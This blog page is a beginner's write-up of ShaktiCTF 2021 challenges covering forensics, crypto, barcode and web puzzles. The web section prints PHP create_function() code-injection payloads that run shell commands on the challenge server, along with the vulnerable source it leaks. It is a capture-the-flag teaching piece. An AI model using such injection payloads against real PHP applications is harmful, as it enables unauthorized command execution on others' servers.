<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>My First CTF | Román Zuleta</title>
<meta name=keywords content>
<meta name=description content="First impresions and Write-up of the Shakti CTF 2021 challenges that I solved.">
<meta name=author content="Román Zuleta">
<link rel=canonical href=https://rzul.me/en/posts/first-ctf/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css integrity="sha256-7I2jZsovtkdTfMt6j2+ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://rzul.me/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://rzul.me/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://rzul.me/favicon-32x32.png>
<link rel=apple-touch-icon href=https://rzul.me/apple-touch-icon.png>
<link rel=mask-icon href=https://rzul.me/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<link rel=alternate hreflang=es href=https://rzul.me/posts/first-ctf/>
<link rel=alternate hreflang=en href=https://rzul.me/en/posts/first-ctf/>
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
</noscript><meta property="og:title" content="My First CTF">
<meta property="og:description" content="First impresions and Write-up of the Shakti CTF 2021 challenges that I solved.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://rzul.me/en/posts/first-ctf/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-04-07T10:43:09-05:00">
<meta property="article:modified_time" content="2021-04-07T10:43:09-05:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="My First CTF">
<meta name=twitter:description content="First impresions and Write-up of the Shakti CTF 2021 challenges that I solved.">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://rzul.me/en/posts/"},{"@type":"ListItem","position":2,"name":"My First CTF","item":"https://rzul.me/en/posts/first-ctf/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"My First CTF","name":"My First CTF","description":"First impresions and Write-up of the Shakti CTF 2021 challenges that I solved.","keywords":[],"articleBody":"Intro April 3, 2021 TeamShakti published it’s annual CTF Beginner Friendly competition which has it’s team name ShaktiCTF. I decided to be part of it and try some luck being that “officially” I had never participated in a CTF before. It looked to me a great opportunnity to practice, learn new things and sharp my skills, looking forward (assuming that it’s hurried step) for an acceptable position at the next Hackthebox CTF.\nIntroducing a Write-up of the CTF’s challenges I could solved during my participation.\nForensics Follow up - 50 Description We got a clue from one of our investigators that an interesting secret was transferred in our network. Help us find out the secret.\nnetwork1.pcapng\nSolution Downloading the pcapng file given we can idenfify a TCP stream using wireshark, following that stream we catch a pastebin link.\nThe flag was inside it’s content.\nFlag: shaktictf{Th15_w4s_eA5Y!!}\nDelete - 100 Description Sometimes what you see is not always true…\nchall.png\nSolution Downloading the image given and after analyzing it with binwalk, we can observe that apparently there are two images inside the same file, following challenge’s title which could be considered as a hint we can use dd to play around those bytes looking for a valid image.\n┌──(kali㉿kali)-[~/Desktop/shaktictf/forensics] └─$ binwalk chall.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 264 x 191, 8-bit colormap, non-interlaced 48 0x30 PNG image, 1200 x 1200, 8-bit/color RGBA, non-interlaced 89 0x59 Zlib compressed data, default compression ┌──(kali㉿kali)-[~/Desktop/shaktictf/forensics] └─$ dd skip=48 if=chall.png of=chall1.png bs=1 46287+0 records in 46287+0 records out 46287 bytes (46 kB, 45 KiB) copied, 0.284482 s, 163 kB/s By this way chall1.png turns to a valid image which can be opened with any image viewer with any problem. Gaining that way the flag.\nFlag: shaktictf{Y0u_4R3_aM4z1nG!!!!}\nWeb Magic - 100 Description I found creating new functionalities as magic. So I went and created quite a few, now I don’t remember what is what. help me remember them :( !\ncheck out my application - http://35.238.173.184/\nSolution According with /admin.php log we could look for any vulnerability about the mentioned deprecated function create_function() and we can find that it is vulnerable to code injection\nAllowing us to list files in the current folrder using:\nreturn -1 * var_dump($a[\"\"]);}system(\"ls -la\");/*\"]\ntotal 84 drwxrwxrwx 1 www-data www-data 4096 Apr 3 11:43 . drwxr-xr-x 1 root root 4096 Mar 31 09:51 .. -rw-r--r-- 1 www-data www-data 0 Apr 3 11:02 12345642312 -rw-r--r-- 1 www-data www-data 65 Apr 2 23:39 1998_Dumb_secrets.php -rw-rw-r-- 1 www-data www-data 134 Apr 2 23:19 Dockerfile -rw-r--r-- 1 www-data www-data 39 Apr 3 11:40 a -rw-r--r-- 1 www-data www-data 0 Apr 3 11:39 aaa -rw-r--r-- 1 www-data www-data 1 Apr 3 11:40 aaaa -rw-r--r-- 1 www-data www-data 3251 Apr 2 22:45 admin.php lrwxrwxrwx 1 www-data www-data 8 Apr 3 11:43 asd - flag.txt -rw-r--r-- 1 www-data www-data 1886 Apr 2 22:45 chat.html -rw-r--r-- 1 www-data www-data 1744 Apr 2 22:45 check.html drwxr-xr-x 1 www-data www-data 4096 Apr 2 22:47 css -rw-r--r-- 1 www-data www-data 39 Apr 3 09:58 flag.html -rw-r--r-- 1 www-data www-data 39 Apr 3 11:35 flag.php -rw-r--r-- 1 www-data www-data 39 Apr 3 09:57 flag.txt drwxr-xr-x 1 www-data www-data 4096 Apr 2 22:47 fonts -rw-r--r-- 1 www-data www-data 1935 Apr 2 22:45 index.html -rw-r--r-- 1 www-data www-data 2114 Apr 2 22:45 login.html -rw-r--r-- 1 www-data www-data 1949 Apr 2 22:45 report.html -rw-r--r-- 1 www-data www-data 1976 Apr 2 22:45 rules.html -rw-r--r-- 1 www-data www-data 0 Apr 3 11:04 s.php -rw-r--r-- 1 www-data www-data 5 Apr 3 10:06 test.php admin.php content using:\nreturn -1 * var_dump($a[\"\"]);}system(\"cat admin.php\");/*\"]\nView response page source\nphp ini_set('display_errors', 'on'); ini_set('error_reporting', E_ALL); $success = ' \u0026times; Function declared.  '; include \"flag.php\"; if (isset ($_POST['c']) \u0026\u0026 !empty ($_POST['c'])) { $blacklist = \"/mv|rm|exec/i\"; $code = $_POST['c']; if(strlen($code)60) { die(\"too long to execute\"); } if(preg_match($blacklist,$code)){ die(\"that's blocked\"); } $fun = create_function('$flag', $code); print($success); } ?After identifying an uncommon file 1998_Dumb_secrets.php I tried to view it’s content using:\nreturn -1 * var_dump($a[\"\"]);}system(\"cat 1998_Dumb_secrets.php\");/*\"]\nWhich response was\ntoo long to execute\nAnalysing code’s petition process, we can view that form’s length is being validated which means that if we short form’s value we should read the file we want. Using:\nreturn -1;}system(\"cat 1998_Dumb_secrets.php\");/*\"]\nView response page source\nFlag: shaktictf{p0tn714l_0f_func710n5_4r3_1nf1n173}\nCrypto Classically Easy - 50 Description ovmogeqfj{yahe_wgwff_avpv_eszahtmac_qxefowoey!}\nSolution Doing some analysis of the given string we could clearly see that it’s format and flag’s format are the same. After discarding some options we know that could help to decipher it (Caesar cipher , ROT N cipher), we could try another approach following rotation’s principle.\n   Char Recibied Rotation value Known Char     o +4 s   v +12 h   m +14 a   o +22 k   g +13 t   e +4 i   q +12 c   f +14 t   j +22 f    This could mean a numeric rotation pattern viewing space repetition between the given string char and flag char, which is +4,+12,+14,+22,+13.\nDoing a manual substitution\nshaktictf{lets_start_with_14,22,13,4,12,14,22,13,4_12,14,22,13,4,12,14,22,13!}\nMethod optimization using a simple script\n#!/usr/bin/python abc = \"abcdefghijklmnopqrstuvwxyz\" values = [4,12,14,22,13] decrypt = \"ovmogeqfj{yahe_wgwff_avpv_eszahtmac_qxefowoey!}\" avoid = \"{}_!\" flag = \"\" valIndex = 0 for letter in decrypt: if letter in avoid: flag += letter continue if valIndex = len(values): valIndex = 0 flag += abc[(abc.index(letter) + values[valIndex]) - len(abc)] valIndex += 1 print(flag) Script result\nFlag: shaktictf{lets_start_with_something_classical!}\nMisc Sanity Check - 10 The flag is showed at the event’s discord server inside rules channel.\n13 . Grab your 10 points : shaktictf{G00d_t0_r34d_th3_rUl3s!}\nFlag: shaktictf{G00d_t0_r34d_th3_rUl3s!}\ndecodeit - 100 Description just decode it!\nSolution Image downloaded\nUsing https://zxing.org/w/decode.jspx barcodes can be decoded and gain the flag.\nDecode Succeeded Raw text\nshaktictf{N1C3_w0rK_Fr13nD}\nRaw bytes\n68 53 48 41 4b 54 49 43 54 46 5b 2e 11 23 13 3f 57 10 52 2b 3f 26 52 11 13 4e 24 5d 65 6a\nBarcode format\tCODE_128 Parsed Result Type\tTEXT Parsed Result\nFlag: shaktictf{N1C3_w0rK_Fr13nD}\nLast words Considering that my participation was one-man show I gained 156 place of 452 with 410 points.\nSome unfficial Write-ups\n","wordCount":"1007","inLanguage":"en","datePublished":"2021-04-07T10:43:09-05:00","dateModified":"2021-04-07T10:43:09-05:00","author":{"@type":"Person","name":"Román Zuleta"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rzul.me/en/posts/first-ctf/"},"publisher":{"@type":"Organization","name":"Román Zuleta","logo":{"@type":"ImageObject","url":"https://rzul.me/favicon.ico"}}}</script>
</head>
<body class=dark id=top>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://rzul.me/en/ accesskey=h title="Román Zuleta (Alt + H)">Román Zuleta</a>
<span class=logo-switches>
<ul class=lang-switch><li>|</li>
<li>
<a href=https://rzul.me/ title=Español aria-label=Español>Es</a>
</li>
</ul>
</span>
</div>
<ul id=menu>
<li>
<a href=https://rzul.me/en/archives/ title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://rzul.me/en/categories/ title=Categories>
<span>Categories</span>
</a>
</li>
<li>
<a href=https://rzul.me/en/tags/ title=Tags>
<span>Tags</span>
</a>
</li>
<li>
<a href=https://rzul.me/en/search/ title="Search (Alt + /)" accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://rzul.me/en/>Home</a>&nbsp;»&nbsp;<a href=https://rzul.me/en/posts/>Posts</a></div>
<h1 class=post-title>
My First CTF
</h1>
<div class=post-description>
First impresions and Write-up of the Shakti CTF 2021 challenges that I solved.
</div>
<div class=post-meta><span title="2021-04-07 10:43:09 -0500 CDT">April 7, 2021</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Román Zuleta&nbsp;|&nbsp;Translations:
<ul class=i18n_list>
<li>
<a href=https://rzul.me/posts/first-ctf/>Es</a>
</li>
</ul>
</div>
</header> <div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#intro aria-label=Intro>Intro</a></li>
<li>
<a href=#forensics aria-label=Forensics>Forensics</a><ul>
<li>
<a href=#follow-up---50 aria-label="Follow up - 50">Follow up - 50</a><ul>
<li>
<a href=#description aria-label=Description>Description</a></li>
<li>
<a href=#solution aria-label=Solution>Solution</a></li></ul>
</li>
<li>
<a href=#delete---100 aria-label="Delete - 100">Delete - 100</a><ul>
<li>
<a href=#description-1 aria-label=Description>Description</a></li>
<li>
<a href=#solution-1 aria-label=Solution>Solution</a></li></ul>
</li></ul>
</li>
<li>
<a href=#web aria-label=Web>Web</a><ul>
<li>
<a href=#magic---100 aria-label="Magic - 100">Magic - 100</a><ul>
<li>
<a href=#description-2 aria-label=Description>Description</a></li>
<li>
<a href=#solution-2 aria-label=Solution>Solution</a></li></ul>
</li></ul>
</li>
<li>
<a href=#crypto aria-label=Crypto>Crypto</a><ul>
<li>
<a href=#classically-easy---50 aria-label="Classically Easy - 50">Classically Easy - 50</a><ul>
<li>
<a href=#description-3 aria-label=Description>Description</a></li>
<li>
<a href=#solution-3 aria-label=Solution>Solution</a></li></ul>
</li></ul>
</li>
<li>
<a href=#misc aria-label=Misc>Misc</a><ul>
<li>
<a href=#sanity-check---10 aria-label="Sanity Check - 10">Sanity Check - 10</a></li>
<li>
<a href=#decodeit---100 aria-label="decodeit - 100">decodeit - 100</a><ul>
<li>
<a href=#description-4 aria-label=Description>Description</a></li>
<li>
<a href=#solution-4 aria-label=Solution>Solution</a></li></ul>
</li></ul>
</li>
<li>
<a href=#last-words aria-label="Last words">Last words</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><h1 id=intro>Intro<a hidden class=anchor aria-hidden=true href=#intro>#</a></h1>
<p>April 3, 2021 <a href=https://teamshakti.in>TeamShakti</a> published it&rsquo;s annual CTF Beginner Friendly competition which has it&rsquo;s team name <a href=https://ctf.shakticon.com/>ShaktiCTF</a>. I decided to be part of it and try some luck being that &ldquo;officially&rdquo; I had never participated in a CTF before. It looked to me a great opportunnity to practice, learn new things and sharp my skills, looking forward (assuming that it&rsquo;s hurried step) for an acceptable position at the next <a href=https://www.hackthebox.eu/cyber-apocalypse-ctf-2021>Hackthebox CTF</a>.</p>
<p>Introducing a Write-up of the CTF&rsquo;s challenges I could solved during my participation.</p>
<h1 id=forensics>Forensics<a hidden class=anchor aria-hidden=true href=#forensics>#</a></h1>
<h2 id=follow-up---50>Follow up - 50<a hidden class=anchor aria-hidden=true href=#follow-up---50>#</a></h2>
<h3 id=description>Description<a hidden class=anchor aria-hidden=true href=#description>#</a></h3>
<p>We got a clue from one of our investigators that an interesting secret was transferred in our network. Help us find out the secret.</p>
<p><a href=/files/posts/first-ctf/network1.pcapng>network1.pcapng</a></p>
<h3 id=solution>Solution<a hidden class=anchor aria-hidden=true href=#solution>#</a></h3>
<p>Downloading the <code>pcapng</code> file given we can idenfify a TCP stream using wireshark, following that stream we catch a <a href=https://pastebin.com/4NXGaVbA>pastebin link</a>.</p>
<p>The flag was inside it&rsquo;s content.</p>
<p><strong>Flag:</strong> <code>shaktictf{Th15_w4s_eA5Y!!}</code></p>
<h2 id=delete---100>Delete - 100<a hidden class=anchor aria-hidden=true href=#delete---100>#</a></h2>
<h3 id=description-1>Description<a hidden class=anchor aria-hidden=true href=#description-1>#</a></h3>
<p>Sometimes what you see is not always true&mldr;</p>
<p><a href=/images/posts/first-ctf/chall.png>chall.png</a></p>
<h3 id=solution-1>Solution<a hidden class=anchor aria-hidden=true href=#solution-1>#</a></h3>
<p>Downloading the image given and after analyzing it with <code>binwalk</code>, we can observe that apparently there are two images inside the same file, following challenge&rsquo;s title which could be considered as a hint we can use <code>dd</code> to play around those bytes looking for a valid image.</p>
<pre tabindex=0><code>┌──(kali㉿kali)-[~/Desktop/shaktictf/forensics]
└─$ binwalk chall.png    

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 264 x 191, 8-bit colormap, non-interlaced
48            0x30            PNG image, 1200 x 1200, 8-bit/color RGBA, non-interlaced
89            0x59            Zlib compressed data, default compression


┌──(kali㉿kali)-[~/Desktop/shaktictf/forensics]
└─$ dd skip=48 if=chall.png of=chall1.png bs=1                                
46287+0 records in
46287+0 records out
46287 bytes (46 kB, 45 KiB) copied, 0.284482 s, 163 kB/s
</code></pre><p>By this way <code>chall1.png</code> turns to a valid image which can be opened with any image viewer with any problem. Gaining that way the flag.</p>
<p><strong>Flag:</strong> <code>shaktictf{Y0u_4R3_aM4z1nG!!!!}</code></p>
<p><img loading=lazy src=/images/posts/first-ctf/chall1.png alt=chall1.png>
</p>
<h1 id=web>Web<a hidden class=anchor aria-hidden=true href=#web>#</a></h1>
<h2 id=magic---100>Magic - 100<a hidden class=anchor aria-hidden=true href=#magic---100>#</a></h2>
<h3 id=description-2>Description<a hidden class=anchor aria-hidden=true href=#description-2>#</a></h3>
<p>I found creating new functionalities as magic. So I went and created quite a few, now I don&rsquo;t remember what is what. help me remember them :( !</p>
<p>check out my application - <a href=http://35.238.173.184/>http://35.238.173.184/</a></p>
<h3 id=solution-2>Solution<a hidden class=anchor aria-hidden=true href=#solution-2>#</a></h3>
<p>According with <code>/admin.php</code> log we could look for any vulnerability about the mentioned deprecated function <code>create_function()</code> and we can find that it is <a href=https://www.exploit-db.com/exploits/32417>vulnerable to code injection</a></p>
<p>Allowing us to list files in the current folrder using:</p>
<p><code>return -1 * var_dump($a[""]);}system("ls -la");/*"]</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>total <span style=color:#ae81ff>84</span>
drwxrwxrwx <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>3</span> 11:43 .
drwxr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>31</span> 09:51 ..
-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>0</span> Apr <span style=color:#ae81ff>3</span> 11:02 <span style=color:#ae81ff>12345642312</span>
-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>65</span> Apr <span style=color:#ae81ff>2</span> 23:39 1998_Dumb_secrets.php
-rw-rw-r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>134</span> Apr <span style=color:#ae81ff>2</span> 23:19 Dockerfile
-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>39</span> Apr <span style=color:#ae81ff>3</span> 11:40 a
-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>0</span> Apr <span style=color:#ae81ff>3</span> 11:39 aaa
-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>1</span> Apr <span style=color:#ae81ff>3</span> 11:40 aaaa
-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>3251</span> Apr <span style=color:#ae81ff>2</span> 22:45 admin.php
lrwxrwxrwx <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>8</span> Apr <span style=color:#ae81ff>3</span> 11:43 asd -&gt; flag.txt
-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>1886</span> Apr <span style=color:#ae81ff>2</span> 22:45 chat.html
-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>1744</span> Apr <span style=color:#ae81ff>2</span> 22:45 check.html
drwxr-xr-x <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>2</span> 22:47 css
-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>39</span> Apr <span style=color:#ae81ff>3</span> 09:58 flag.html
-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>39</span> Apr <span style=color:#ae81ff>3</span> 11:35 flag.php
-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>39</span> Apr <span style=color:#ae81ff>3</span> 09:57 flag.txt
drwxr-xr-x <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>2</span> 22:47 fonts
-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>1935</span> Apr <span style=color:#ae81ff>2</span> 22:45 index.html
-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>2114</span> Apr <span style=color:#ae81ff>2</span> 22:45 login.html
-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>1949</span> Apr <span style=color:#ae81ff>2</span> 22:45 report.html
-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>1976</span> Apr <span style=color:#ae81ff>2</span> 22:45 rules.html
-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>0</span> Apr <span style=color:#ae81ff>3</span> 11:04 s.php
-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>5</span> Apr <span style=color:#ae81ff>3</span> 10:06 test.php
</code></pre></div><p><code>admin.php</code> content using:</p>
<p><code>return -1 * var_dump($a[""]);}system("cat admin.php");/*"]</code></p>
<p><strong>View response page source</strong></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
<span style=color:#a6e22e>ini_set</span>(<span style=color:#e6db74>&#39;display_errors&#39;</span>, <span style=color:#e6db74>&#39;on&#39;</span>);
<span style=color:#a6e22e>ini_set</span>(<span style=color:#e6db74>&#39;error_reporting&#39;</span>, <span style=color:#66d9ef>E_ALL</span>);

$success <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;
</span><span style=color:#e6db74>&lt;div class=&#34;alert alert-success alert-dismissible&#34; role=&#34;alert&#34;&gt;
</span><span style=color:#e6db74>    &lt;button type=&#34;button&#34; class=&#34;close&#34; data-dismiss=&#34;alert&#34; aria-label=&#34;Close&#34;&gt;&lt;span aria-hidden=&#34;true&#34;&gt;&amp;times;&lt;/span&gt;&lt;/button&gt;
</span><span style=color:#e6db74>    Function declared.
</span><span style=color:#e6db74>&lt;/div&gt;
</span><span style=color:#e6db74>&#39;</span>;

<span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#34;flag.php&#34;</span>;

<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span> ($_POST[<span style=color:#e6db74>&#39;c&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span> ($_POST[<span style=color:#e6db74>&#39;c&#39;</span>])) {
    $blacklist <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/mv|rm|exec/i&#34;</span>;
    $code <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;c&#39;</span>];
    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strlen</span>($code)<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>60</span>) {
        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;too long to execute&#34;</span>);
    }
    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>($blacklist,$code)){
        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;that&#39;s blocked&#34;</span>);
    }
    $fun <span style=color:#f92672>=</span> <span style=color:#a6e22e>create_function</span>(<span style=color:#e6db74>&#39;$flag&#39;</span>, $code);
    <span style=color:#66d9ef>print</span>($success);

}
<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></code></pre></div><p>After identifying an uncommon file <code>1998_Dumb_secrets.php</code> I tried to view it&rsquo;s content using:</p>
<p><code>return -1 * var_dump($a[""]);}system("cat 1998_Dumb_secrets.php");/*"]</code></p>
<p>Which response was</p>
<p><code>too long to execute</code></p>
<p>Analysing code&rsquo;s petition process, we can view that form&rsquo;s length is being validated which means that if we short form&rsquo;s value we should read the file we want. Using:</p>
<p><code>return -1;}system("cat 1998_Dumb_secrets.php");/*"]</code></p>
<p><strong>View response page source</strong></p>
<pre tabindex=0><code>&lt;?php
$flag1=&quot;shaktictf{p0tn714l_0f_func710n5_4r3_1nf1n173}&quot;;
?&gt;
</code></pre><p><strong>Flag:</strong> <code>shaktictf{p0tn714l_0f_func710n5_4r3_1nf1n173}</code></p>
<h1 id=crypto>Crypto<a hidden class=anchor aria-hidden=true href=#crypto>#</a></h1>
<h2 id=classically-easy---50>Classically Easy - 50<a hidden class=anchor aria-hidden=true href=#classically-easy---50>#</a></h2>
<h3 id=description-3>Description<a hidden class=anchor aria-hidden=true href=#description-3>#</a></h3>
<p>ovmogeqfj{yahe_wgwff_avpv_eszahtmac_qxefowoey!}</p>
<h3 id=solution-3>Solution<a hidden class=anchor aria-hidden=true href=#solution-3>#</a></h3>
<p>Doing some analysis of the given string we could clearly see that it&rsquo;s format and flag&rsquo;s format are the same. After discarding some options we know that could help to decipher it (Caesar cipher , ROT N cipher), we could try another approach following rotation&rsquo;s principle.</p>
<table>
<thead>
<tr>
<th style=text-align:center>Char Recibied</th>
<th style=text-align:center>Rotation value</th>
<th style=text-align:center>Known Char</th>
</tr>
</thead>
<tbody>
<tr>
<td style=text-align:center>o</td>
<td style=text-align:center>+4</td>
<td style=text-align:center>s</td>
</tr>
<tr>
<td style=text-align:center>v</td>
<td style=text-align:center>+12</td>
<td style=text-align:center>h</td>
</tr>
<tr>
<td style=text-align:center>m</td>
<td style=text-align:center>+14</td>
<td style=text-align:center>a</td>
</tr>
<tr>
<td style=text-align:center>o</td>
<td style=text-align:center>+22</td>
<td style=text-align:center>k</td>
</tr>
<tr>
<td style=text-align:center>g</td>
<td style=text-align:center>+13</td>
<td style=text-align:center>t</td>
</tr>
<tr>
<td style=text-align:center>e</td>
<td style=text-align:center>+4</td>
<td style=text-align:center>i</td>
</tr>
<tr>
<td style=text-align:center>q</td>
<td style=text-align:center>+12</td>
<td style=text-align:center>c</td>
</tr>
<tr>
<td style=text-align:center>f</td>
<td style=text-align:center>+14</td>
<td style=text-align:center>t</td>
</tr>
<tr>
<td style=text-align:center>j</td>
<td style=text-align:center>+22</td>
<td style=text-align:center>f</td>
</tr>
</tbody>
</table>
<p>This could mean a numeric rotation pattern viewing space repetition between the given string char and flag char, which is +4,+12,+14,+22,+13.</p>
<p>Doing a manual substitution</p>
<p><code>shaktictf{lets_start_with_14,22,13,4,12,14,22,13,4_12,14,22,13,4,12,14,22,13!}</code></p>
<p>Method optimization using a simple script</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
abc <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;abcdefghijklmnopqrstuvwxyz&#34;</span>
values <span style=color:#f92672>=</span> [<span style=color:#ae81ff>4</span>,<span style=color:#ae81ff>12</span>,<span style=color:#ae81ff>14</span>,<span style=color:#ae81ff>22</span>,<span style=color:#ae81ff>13</span>]
decrypt <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ovmogeqfj{yahe_wgwff_avpv_eszahtmac_qxefowoey!}&#34;</span>
avoid <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>_!&#34;</span>
flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
valIndex <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
<span style=color:#66d9ef>for</span> letter <span style=color:#f92672>in</span> decrypt:
    <span style=color:#66d9ef>if</span> letter <span style=color:#f92672>in</span> avoid:
        flag <span style=color:#f92672>+=</span> letter
        <span style=color:#66d9ef>continue</span>
    <span style=color:#66d9ef>if</span> valIndex <span style=color:#f92672>&gt;=</span> len(values):
        valIndex <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
    flag <span style=color:#f92672>+=</span> abc[(abc<span style=color:#f92672>.</span>index(letter) <span style=color:#f92672>+</span> values[valIndex]) <span style=color:#f92672>-</span> len(abc)]
    valIndex <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
print(flag)
</code></pre></div><p>Script result</p>
<p><strong>Flag:</strong> <code>shaktictf{lets_start_with_something_classical!}</code></p>
<h1 id=misc>Misc<a hidden class=anchor aria-hidden=true href=#misc>#</a></h1>
<h2 id=sanity-check---10>Sanity Check - 10<a hidden class=anchor aria-hidden=true href=#sanity-check---10>#</a></h2>
<p>The flag is showed at the event&rsquo;s discord server inside rules channel.</p>
<p><code>13 . Grab your 10 points : shaktictf{G00d_t0_r34d_th3_rUl3s!}</code></p>
<p><strong>Flag:</strong> <code>shaktictf{G00d_t0_r34d_th3_rUl3s!}</code></p>
<h2 id=decodeit---100>decodeit - 100<a hidden class=anchor aria-hidden=true href=#decodeit---100>#</a></h2>
<h3 id=description-4>Description<a hidden class=anchor aria-hidden=true href=#description-4>#</a></h3>
<p>just decode it!</p>
<h3 id=solution-4>Solution<a hidden class=anchor aria-hidden=true href=#solution-4>#</a></h3>
<p>Image downloaded</p>
<p><img loading=lazy src=/images/posts/first-ctf/decodeit.png alt=Barcode>
</p>
<p>Using <a href=https://zxing.org/w/decode.jspx>https://zxing.org/w/decode.jspx</a> barcodes can be decoded and gain the flag.</p>
<p>Decode Succeeded
Raw text</p>
<p>shaktictf{N1C3_w0rK_Fr13nD}</p>
<p>Raw bytes</p>
<p>68 53 48 41 4b 54 49 43 54 46 5b 2e 11 23 13 3f
57 10 52 2b 3f 26 52 11 13 4e 24 5d 65 6a</p>
<p>Barcode format CODE_128
Parsed Result Type TEXT
Parsed Result</p>
<p><strong>Flag:</strong> <code>shaktictf{N1C3_w0rK_Fr13nD}</code></p>
<h1 id=last-words>Last words<a hidden class=anchor aria-hidden=true href=#last-words>#</a></h1>
<p>Considering that my participation was one-man show I gained <a href=https://ctf.shakticon.com/users/59>156 place of 452</a> with 410 points.</p>
<p><img loading=lazy src=/images/posts/first-ctf/work.jpg alt="Honest work">
</p>
<p><a href=https://ctftime.org/event/1251/tasks/><strong>Some unfficial Write-ups</strong></a></p>
</div>
<footer class=post-footer>
<ul class=post-tags>
</ul>
